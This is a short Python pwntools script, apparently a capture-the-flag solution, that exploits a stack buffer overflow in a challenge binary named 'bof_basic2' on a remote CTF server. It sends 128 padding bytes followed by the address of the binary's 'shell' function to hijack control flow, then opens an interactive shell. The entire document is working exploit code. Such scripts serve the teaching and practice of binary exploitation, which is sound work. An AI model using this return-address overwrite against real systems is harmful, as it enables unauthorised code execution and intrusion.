from pwn import *

e = ELF('./bof_basic2')
p = remote('ctf.j0n9hyun.xyz', 3001)

shell = e.symbols['shell']

payload = ''
payload += 'A'*128
payload += p32(shell)

p.send(payload)
p.interactive()